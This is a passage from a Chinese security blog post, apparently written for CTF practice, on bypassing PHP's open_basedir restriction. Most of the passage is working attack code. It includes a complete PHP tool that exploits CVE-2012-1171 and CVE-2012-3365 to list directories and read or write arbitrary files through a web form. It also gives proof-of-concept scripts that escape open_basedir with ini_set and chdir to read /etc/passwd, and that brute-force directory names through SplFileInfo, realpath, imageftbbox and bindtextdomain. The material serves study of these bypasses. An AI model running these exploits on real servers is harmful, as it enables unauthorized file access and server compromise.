+		preg_match($regexp, $errstr, $matches);
+		if (isset($matches[1])) &#123;
+			$this-&gt;fileList[] &#x3D; $matches[1];
+		&#125;
+
+	&#125;
+&#125;
+
+abstract class FileWriter implements Exploitable &#123;
+	var $filePath;
+
+	function isAvailable() &#123;&#125;
+	function getDescription() &#123;&#125;
+	function write($content) &#123;&#125;
+	function setFilePath($filePath) &#123;
+		$this-&gt;filePath &#x3D; $filePath;
+	&#125;
+	function getFilePath() &#123;
+		return $this-&gt;filePath;
+	&#125;
+&#125;
+
+abstract class FileReader implements Exploitable &#123;
+	var $filePath;
+
+	function isAvailable() &#123;&#125;
+	function getDescription() &#123;&#125;
+	function read() &#123;&#125;
+	function setFilePath($filePath) &#123;
+		$this-&gt;filePath &#x3D; $filePath;
+	&#125;
+	function getFilePath() &#123;
+		return $this-&gt;filePath;
+	&#125;
+&#125;
+
+&#x2F;&#x2F; Assistant class for DOMFileWriter &amp; DOMFileReader
+class StreamExploiter &#123;
+	var $mode, $filePath, $fileContent;
+
+	function stream_close() &#123;
+		$doc &#x3D; new DOMDocument;
+		$doc-&gt;strictErrorChecking &#x3D; false;
+		switch ($this-&gt;mode) &#123;
+		case &#39;w&#39;:
+			$doc-&gt;loadHTML($this-&gt;fileContent);
+			$doc-&gt;removeChild($doc-&gt;firstChild);
+			$doc-&gt;saveHTMLFile($this-&gt;filePath);
+			break;
+		default:
+		case &#39;r&#39;:
+			$doc-&gt;resolveExternals &#x3D; true;
+			$doc-&gt;substituteEntities &#x3D; true;
+			$doc-&gt;loadXML(&quot;&lt;!DOCTYPE doc [&lt;!ENTITY file SYSTEM \&quot;file:&#x2F;&#x2F;&#123;$this-&gt;filePath&#125;\&quot;&gt;]&gt;&lt;doc&gt;&amp;file;&lt;&#x2F;doc&gt;&quot;, LIBXML_PARSEHUGE);
+			echo $doc-&gt;documentElement-&gt;firstChild-&gt;nodeValue;
+		&#125;
+	&#125;
+	function stream_open($path, $mode, $options, &amp;$opened_path) &#123;
+		$this-&gt;filePath &#x3D; substr($path, 10);
+		$this-&gt;mode &#x3D; $mode;
+		return true;
+	&#125;
+	public function stream_write($data) &#123;
+		$this-&gt;fileContent &#x3D; $data;
+		return strlen($data);
+	&#125;
+&#125;
+
+class DOMFileWriter extends FileWriter &#123;
+	function isAvailable() &#123;
+		return extension_loaded(&#39;dom&#39;) &amp;&amp; (version_compare(phpversion(), &#39;5.3.10&#39;, &#39;&lt;&#x3D;&#39;) || version_compare(phpversion(), &#39;5.4.0&#39;, &#39;&#x3D;&#39;));
+	&#125;
+	function getDescription() &#123;
+		return &#39;Write to and create a file exploiting CVE-2012-1171 (allow overriding). Notice the content should be in well-formed XML format.&#39;;
+	&#125;
+	function write($content) &#123;
+		&#x2F;&#x2F; set it to global resource in order to trigger RSHUTDOWN
+		global $_DOM_exploit_resource;
+		stream_wrapper_register(&#39;exploit&#39;, &#39;StreamExploiter&#39;);
+		$_DOM_exploit_resource &#x3D; fopen(&quot;exploit:&#x2F;&#x2F;&#123;$this-&gt;getFilePath()&#125;&quot;, &#39;w&#39;);
+		fwrite($_DOM_exploit_resource, $content);
+	&#125;
+&#125;
+
+class DOMFileReader extends FileReader &#123;
+	function isAvailable() &#123;
+		return extension_loaded(&#39;dom&#39;) &amp;&amp; (version_compare(phpversion(), &#39;5.3.10&#39;, &#39;&lt;&#x3D;&#39;) || version_compare(phpversion(), &#39;5.4.0&#39;, &#39;&#x3D;&#39;));
+	&#125;
+	function getDescription() &#123;
+		return &#39;Read a file exploiting CVE-2012-1171. Notice the content should be in well-formed XML format.&#39;;
+	&#125;
+	function read() &#123;
+		&#x2F;&#x2F; set it to global resource in order to trigger RSHUTDOWN
+		global $_DOM_exploit_resource;
+		stream_wrapper_register(&#39;exploit&#39;, &#39;StreamExploiter&#39;);
+		$_DOM_exploit_resource &#x3D; fopen(&quot;exploit:&#x2F;&#x2F;&#123;$this-&gt;getFilePath()&#125;&quot;, &#39;r&#39;);
+	&#125;
+&#125;
+
+class SqliteFileWriter extends FileWriter &#123;
+	function isAvailable() &#123;
+		return is_writable(getcwd())
+			&amp;&amp; (extension_loaded(&#39;sqlite3&#39;) || extension_loaded(&#39;sqlite&#39;))
+			&amp;&amp; (version_compare(phpversion(), &#39;5.3.15&#39;, &#39;&lt;&#x3D;&#39;) || (version_compare(phpversion(), &#39;5.4.5&#39;, &#39;&lt;&#x3D;&#39;) &amp;&amp; PHP_MINOR_VERSION &#x3D;&#x3D; 4));
+	&#125;
+	function getDescription() &#123;
+		return &#39;Create a file with custom content exploiting CVE-2012-3365 (disallow overriding). Junk contents may be inserted&#39;;
+	&#125;
+	function write($content) &#123;
+		$sqlite_class &#x3D; extension_loaded(&#39;sqlite3&#39;) ? &#39;sqlite3&#39; : &#39;SQLiteDatabase&#39;;
+		mkdir(&#39;:memory:&#39;);
+		$payload_path &#x3D; getRelativePath(getcwd() . &#39;&#x2F;:memory:&#39;, $this-&gt;getFilePath());
+		$payload &#x3D; str_replace(&#39;\&#39;&#39;, &#39;\&#39;\&#39;&#39;, $content);
+		$database &#x3D; new $sqlite_class(&quot;:memory:&#x2F;&#123;$payload_path&#125;&quot;);
+		$database-&gt;exec(&quot;CREATE TABLE foo (bar STRING)&quot;);
+		$database-&gt;exec(&quot;INSERT INTO foo (bar) VALUES (&#39;&#123;$payload&#125;&#39;)&quot;);
+		$database-&gt;close();
+		rmdir(&#39;:memory:&#39;);
+	&#125;
+&#125;
+
+&#x2F;&#x2F; End of Core
+?&gt;
+&lt;?php
+$action &#x3D; isset($_GET[&#39;action&#39;]) ? $_GET[&#39;action&#39;] : &#39;&#39;;
+$cwd &#x3D; isset($_GET[&#39;cwd&#39;]) ? $_GET[&#39;cwd&#39;] : getcwd();
+$cwd &#x3D; rtrim($cwd, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
+$directorLister &#x3D; fallback(array(&#39;GlobWrapperDirectoryLister&#39;, &#39;RealpathBruteForceDirectoryLister&#39;));
+$fileWriter &#x3D; fallback(array(&#39;DOMFileWriter&#39;, &#39;SqliteFileWriter&#39;));
+$fileReader &#x3D; fallback(array(&#39;DOMFileReader&#39;));
+$append &#x3D; &#39;&#39;;
+?&gt;
+&lt;style&gt;
+#panel &#123;
+  height: 200px;
+  overflow: hidden;
+&#125;
+#panel &gt; pre &#123;
+  margin: 0;
+  height: 200px;
+&#125;
+&lt;&#x2F;style&gt;
+&lt;div id&#x3D;&quot;panel&quot;&gt;
+&lt;pre id&#x3D;&quot;dl&quot;&gt;
+open_basedir: &lt;span style&#x3D;&quot;color: red&quot;&gt;&lt;?php echo ini_get(&#39;open_basedir&#39;) ? ini_get(&#39;open_basedir&#39;) : &#39;Off&#39;; ?&gt;&lt;&#x2F;span&gt;
+&lt;form style&#x3D;&quot;display:inline-block&quot; action&#x3D;&quot;&quot;&gt;
+&lt;fieldset&gt;&lt;legend&gt;Directory Listing:&lt;&#x2F;legend&gt;Current Directory: &lt;input name&#x3D;&quot;cwd&quot; size&#x3D;&quot;100&quot; value&#x3D;&quot;&lt;?php echo $cwd; ?&gt;&quot;&gt;&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Go&quot;&gt;
+&lt;?php if (get_class($directorLister) &#x3D;&#x3D;&#x3D; &#39;RealpathBruteForceDirectoryLister&#39;): ?&gt;
+&lt;?php
+$characters &#x3D; isset($_GET[&#39;characters&#39;]) ? $_GET[&#39;characters&#39;] : $directorLister-&gt;characters;
+$maxlength &#x3D; isset($_GET[&#39;maxlength&#39;]) ? $_GET[&#39;maxlength&#39;] : $directorLister-&gt;maxlength;
+$append &#x3D; &quot;&amp;characters&#x3D;&#123;$characters&#125;&amp;maxlength&#x3D;&#123;$maxlength&#125;&quot;;
+
+$directorLister-&gt;setMaxlength($maxlength);
+?&gt;
+Search Characters: &lt;input name&#x3D;&quot;characters&quot; size&#x3D;&quot;100&quot; value&#x3D;&quot;&lt;?php echo $characters; ?&gt;&quot;&gt;
+Maxlength of File: &lt;input name&#x3D;&quot;maxlength&quot; size&#x3D;&quot;1&quot; value&#x3D;&quot;&lt;?php echo $maxlength; ?&gt;&quot;&gt;
+&lt;?php endif;?&gt;
+Description      : &lt;strong&gt;&lt;?php echo $directorLister-&gt;getDescription(); ?&gt;&lt;&#x2F;strong&gt;
+&lt;&#x2F;fieldset&gt;
+&lt;&#x2F;form&gt;
+&lt;&#x2F;pre&gt;
+&lt;?php
+$file_path &#x3D; isset($_GET[&#39;file_path&#39;]) ? $_GET[&#39;file_path&#39;] : &#39;&#39;;
+?&gt;
+&lt;pre id&#x3D;&quot;rf&quot;&gt;
+open_basedir: &lt;span style&#x3D;&quot;color: red&quot;&gt;&lt;?php echo ini_get(&#39;open_basedir&#39;) ? ini_get(&#39;open_basedir&#39;) : &#39;Off&#39;; ?&gt;&lt;&#x2F;span&gt;
+&lt;form style&#x3D;&quot;display:inline-block&quot; action&#x3D;&quot;&quot;&gt;
+&lt;fieldset&gt;&lt;legend&gt;Read File :&lt;&#x2F;legend&gt;File Path: &lt;input name&#x3D;&quot;file_path&quot; size&#x3D;&quot;100&quot; value&#x3D;&quot;&lt;?php echo $file_path; ?&gt;&quot;&gt;&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Read&quot;&gt;
+Description: &lt;strong&gt;&lt;?php echo $fileReader-&gt;getDescription(); ?&gt;&lt;&#x2F;strong&gt;&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;rf&quot;&gt;
+&lt;&#x2F;fieldset&gt;
+&lt;&#x2F;form&gt;
+&lt;&#x2F;pre&gt;
+&lt;pre id&#x3D;&quot;wf&quot;&gt;
+open_basedir: &lt;span style&#x3D;&quot;color: red&quot;&gt;&lt;?php echo ini_get(&#39;open_basedir&#39;) ? ini_get(&#39;open_basedir&#39;) : &#39;Off&#39;; ?&gt;&lt;&#x2F;span&gt;
+&lt;form style&#x3D;&quot;display:inline-block&quot; action&#x3D;&quot;&quot;&gt;
+&lt;fieldset&gt;&lt;legend&gt;Write File :&lt;&#x2F;legend&gt;File Path   : &lt;input name&#x3D;&quot;file_path&quot; size&#x3D;&quot;100&quot; value&#x3D;&quot;&lt;?php echo $file_path; ?&gt;&quot;&gt;&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Write&quot;&gt;
+File Content: &lt;textarea cols&#x3D;&quot;70&quot; name&#x3D;&quot;content&quot;&gt;&lt;&#x2F;textarea&gt;
+Description : &lt;strong&gt;&lt;?php echo $fileWriter-&gt;getDescription(); ?&gt;&lt;&#x2F;strong&gt;&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;wf&quot;&gt;
+&lt;&#x2F;fieldset&gt;
+&lt;&#x2F;form&gt;
+&lt;&#x2F;pre&gt;
+&lt;&#x2F;div&gt;
+&lt;a href&#x3D;&quot;#dl&quot;&gt;Directory Listing&lt;&#x2F;a&gt; | &lt;a href&#x3D;&quot;#rf&quot;&gt;Read File&lt;&#x2F;a&gt; | &lt;a href&#x3D;&quot;#wf&quot;&gt;Write File&lt;&#x2F;a&gt;
+&lt;hr&gt;
+&lt;pre&gt;
+&lt;?php if ($action &#x3D;&#x3D;&#x3D; &#39;rf&#39;): ?&gt;
+&lt;plaintext&gt;
+&lt;?php
+$fileReader-&gt;setFilePath($file_path);
+echo $fileReader-&gt;read();
+?&gt;
+&lt;?php elseif ($action &#x3D;&#x3D;&#x3D; &#39;wf&#39;): ?&gt;
+&lt;?php
+if (isset($_GET[&#39;content&#39;])) &#123;
+	$fileWriter-&gt;setFilePath($file_path);
+	$fileWriter-&gt;write($_GET[&#39;content&#39;]);
+	echo &#39;The file should be written.&#39;;
+&#125; else &#123;
+	echo &#39;Something goes wrong.&#39;;
+&#125;
+?&gt;
+&lt;?php else: ?&gt;
+&lt;ol&gt;
+&lt;?php
+$directorLister-&gt;setCurrentPath($cwd);
+$file_list &#x3D; $directorLister-&gt;getFileList();
+$parent_path &#x3D; dirname($cwd);
+
+echo &quot;&lt;li&gt;&lt;a href&#x3D;&#39;?cwd&#x3D;&#123;$parent_path&#125;&#123;$append&#125;#dl&#39;&gt;Parent&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;&quot;;
+if (count($file_list) &gt; 0) &#123;
+	foreach ($file_list as $file) &#123;
+		echo &quot;&lt;li&gt;&lt;a href&#x3D;&#39;?cwd&#x3D;&#123;$cwd&#125;&#123;$file&#125;&#123;$append&#125;#dl&#39;&gt;&#123;$file&#125;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;&quot;;
+	&#125;
+&#125; else &#123;
+	echo &#39;No files found. The path is probably not a directory.&#39;;
+&#125;
+?&gt;
+&lt;&#x2F;ol&gt;
+&lt;?php endif;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="利用ini-set-绕过（比较常用）"><a href="#利用ini-set-绕过（比较常用）" class="headerlink" title="利用ini_set()绕过（比较常用）"></a>利用ini_set()绕过（比较常用）</h2><h3 id="ini-set-函数"><a href="#ini-set-函数" class="headerlink" title="ini_set()函数"></a>ini_set()函数</h3><p><strong>ini_set()用来设置php.ini的值</strong>，在函数执行的时候生效，脚本结束后，设置失效。<strong>无需打开php.ini文件，就能修改配置</strong>。函数用法如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">ini_set ( string $varname , string $newvalue ) : string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>varname是需要设置的值</li>
+<li>newvalue是设置成为新的值</li>
+<li>成功时返回旧的值，失败时返回 FALSE。</li>
+</ul>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>当前我们处在&#x2F;var&#x2F;www&#x2F;html文件夹下，对应的POC为:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+mkdir(&#39;Von&#39;);  &#x2F;&#x2F;创建一个目录Von
+chdir(&#39;Von&#39;);  &#x2F;&#x2F;切换到Von目录下
+ini_set(&#39;open_basedir&#39;,&#39;..&#39;);  &#x2F;&#x2F;把open_basedir切换到上层目录
+chdir(&#39;..&#39;);  &#x2F;&#x2F;以下这三步是把目录切换到根目录
+chdir(&#39;..&#39;);
+chdir(&#39;..&#39;);
+ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);  &#x2F;&#x2F;设置open_basedir为根目录(此时相当于没有设置open_basedir)
+echo file_get_contents(&#39;&#x2F;etc&#x2F;passwd&#39;);  &#x2F;&#x2F;读取&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到，我们成功读取到了&#x2F;etc&#x2F;passwd<img src="/images/open_basedi_9.png" alt="img">至于POC的原理涉及到了PHP的底层实现，较为复杂，具体可以参考这几篇文章。<br><a target="_blank" rel="noopener" href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#poc%E6%B5%8B%E8%AF%95">从PHP底层看open_basedir bypass</a><br><a target="_blank" rel="noopener" href="https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/">php open_basedir 绕过poc分析</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4720">bypass open_basedir的新方法</a><br>这个我个人感觉是所有方法中最强的Payload了，思路很骚，操作也不难。(当然前提是没有被过滤掉相关函数hhhh)</p>
+<h2 id="利用SplFileInfo-getRealPath-类方法绕过"><a href="#利用SplFileInfo-getRealPath-类方法绕过" class="headerlink" title="利用SplFileInfo::getRealPath()类方法绕过"></a>利用SplFileInfo::getRealPath()类方法绕过</h2><p>SplFileInfo类是PHP5.1.2之后引入的一个类，提供一个对文件进行操作的接口。我们在SplFileInfo的构造函数中传入文件相对路径，并且调用getRealPath即可获取文件的绝对路径。<br>这个方法有个特点：完全没有考虑open_basedir。在传入的路径为一个不存在的路径时，会返回false；在传入的路径为一个存在的路径时，会正常返回绝对路径。脚本如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+$info &#x3D; new SplFileInfo(&#39;&#x2F;etc&#x2F;passwd&#39;);
+var_dump($info-&gt;getRealPath());
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>当传入的路径存在时，返回路径。</strong><img src="/images/open_basedir_10.png" alt="img">当传入的路径不存在时，返回False。<img src="/images/open_basedir_11.png" alt="img">但是如果我们完全不知道路径的情况下就和暴力猜解无异了，时间花费极高。在Windows系统下可以利用&lt;&gt;来列出所需目录下的文件，有P神的POC如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+ini_set(&#39;open_basedir&#39;, dirname(__FILE__));
+printf(&quot;&lt;b&gt;open_basedir: %s&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&quot;, ini_get(&#39;open_basedir&#39;));
+$basedir &#x3D; &#39;D:&#x2F;test&#x2F;&#39;;
+$arr &#x3D; array();
+$chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;;
+for ($i&#x3D;0; $i &lt; strlen($chars); $i++) &#123; 
+    $info &#x3D; new SplFileInfo($basedir . $chars[$i] . &#39;&lt;&gt;&lt;&#39;);
+    $re &#x3D; $info-&gt;getRealPath();
+    if ($re) &#123;
+        dump($re);
+    &#125;
+&#125;
+function dump($s)&#123;
+    echo $s . &#39;&lt;br&#x2F;&gt;&#39;;
+    ob_flush();
+    flush();
+&#125;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>当然由于&lt;&gt;&lt;是Windows特有的通配符。所以该POC只能在Windows环境下使用。Linux下只能暴力破解。</p>
+<h2 id="利用realpath-绕过"><a href="#利用realpath-绕过" class="headerlink" title="利用realpath()绕过"></a>利用realpath()绕过</h2><p>realpath()函数和SplFileInfo::getRealPath()作用类似。同样是可以得到绝对路径。函数定义如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">realpath ( string $path ) : string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>当我们传入的路径是一个不存在的文件（目录）时，它将返回false；当我们传入一个不在open_basedir里的文件（目录）时，他将抛出错误（File is not within the allowed path(s)）。 同样，对于这个函数，我们在Windows下仍然能够使用通配符&lt;&gt;来列目录，有P神的脚本如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+ini_set(&#39;open_basedir&#39;, dirname(__FILE__));
+printf(&quot;&lt;b&gt;open_basedir: %s&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&quot;, ini_get(&#39;open_basedir&#39;));
+set_error_handler(&#39;isexists&#39;);
+$dir &#x3D; &#39;d:&#x2F;test&#x2F;&#39;;
+$file &#x3D; &#39;&#39;;
+$chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;;
+for ($i&#x3D;0; $i &lt; strlen($chars); $i++) &#123; 
+    $file &#x3D; $dir . $chars[$i] . &#39;&lt;&gt;&lt;&#39;;
+    realpath($file);
+&#125;
+function isexists($errno, $errstr)
+&#123;
+    $regexp &#x3D; &#39;&#x2F;File\((.*)\) is not within&#x2F;&#39;;
+    preg_match($regexp, $errstr, $matches);
+    if (isset($matches[1])) &#123;
+        printf(&quot;%s &lt;br&#x2F;&gt;&quot;, $matches[1]);
+    &#125;
+&#125;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>realpath()和SplFileInfo::getRealPath()的区别在于,realpath()只有在启用了open_basedir()限制的情况下才能使用这种思路爆目录，而SplFileInfo::getRealPath()可以无视是否开启open_basedir进行列目录(当然，没有开启open_basedir也没必要花这么大的功夫来列目录了)</p>
+<h2 id="利用imageftbbox-绕过"><a href="#利用imageftbbox-绕过" class="headerlink" title="利用imageftbbox()绕过"></a>利用imageftbbox()绕过</h2><p>GD库一般是PHP必备的扩展库之一，当中的imageftbbox()函数也可以起到像realpath()一样的列目录效果。<br>其思想也和open_basedir类似。这个函数第三个参数是字体的路径。我发现当这个参数在open_basedir外的时候，当文件存在，则php会抛出“File(xxxxx) is not within the allowed path(s)”错误。但当文件不存在的时候会抛出“Invalid font filename”错误。 有POC如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">?php
+ini_set(&#39;open_basedir&#39;, dirname(__FILE__));
+printf(&quot;&lt;b&gt;open_basedir: %s&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&quot;, ini_get(&#39;open_basedir&#39;));
+set_error_handler(&#39;isexists&#39;);
+$dir &#x3D; &#39;d:&#x2F;test&#x2F;&#39;;
+$file &#x3D; &#39;&#39;;
+$chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;;
+for ($i&#x3D;0; $i &lt; strlen($chars); $i++) &#123; 
+    $file &#x3D; $dir . $chars[$i] . &#39;&lt;&gt;&lt;&#39;;
+    &#x2F;&#x2F;$m &#x3D; imagecreatefrompng(&quot;zip.png&quot;);
+    &#x2F;&#x2F;imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, &#39;aaa&#39;);
+    imageftbbox(100, 100, $file, &#39;aaa&#39;);
+&#125;
+function isexists($errno, $errstr)
+&#123;
+    global $file;
+    if (stripos($errstr, &#39;Invalid font filename&#39;) &#x3D;&#x3D;&#x3D; FALSE) &#123;
+        printf(&quot;%s&lt;br&#x2F;&gt;&quot;, $file);
+    &#125;
+&#125;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>但是貌似用这种方法进行列目录的话，只能一位一位猜解，具体可以参考P神的文章<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html#0x03-realpath">PHP绕过open_basedir列目录的研究</a><br>总之感觉是挺鸡肋的方法，而且和上面的两种方法类似，由于都使用了Windows的通配符，所以这些POC都只能在Windows下使用，Linux下只能暴力猜解。</p>
+<h2 id="利用bindtextdomain-绕过"><a href="#利用bindtextdomain-绕过" class="headerlink" title="利用bindtextdomain()绕过"></a>利用bindtextdomain()绕过</h2><h3 id="bindtextdomain-函数"><a href="#bindtextdomain-函数" class="headerlink" title="bindtextdomain()函数"></a>bindtextdomain()函数</h3><p>bindtextdomain是php下绑定domain到某个目录的函数。用法如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">bindtextdomain ( string $domain , string $directory ) : string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>第一个参数随便传都行，主要出在第二个参数上，当第二个参数即目录存在时，会返回目录的路径，当目录不存在时，会返回False。故有脚本如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+$re &#x3D; bindtextdomain(&#39;xxx&#39;, $_GET[&#39;dir&#39;]);
+var_dump($re);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这个方法只能用暴力猜解的方法来判断文件是否存在，而且只能在Linux环境下使用，可以说相当鸡肋了。</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Aurorabin</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://zeobi.github.io/2022/09/13/open-basedir-rao-guo/">http://zeobi.github.io/2022/09/13/open-basedir-rao-guo/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Aurorabin</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/ctfshow/">
+                                    <span class="chip bg-color">ctfshow</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
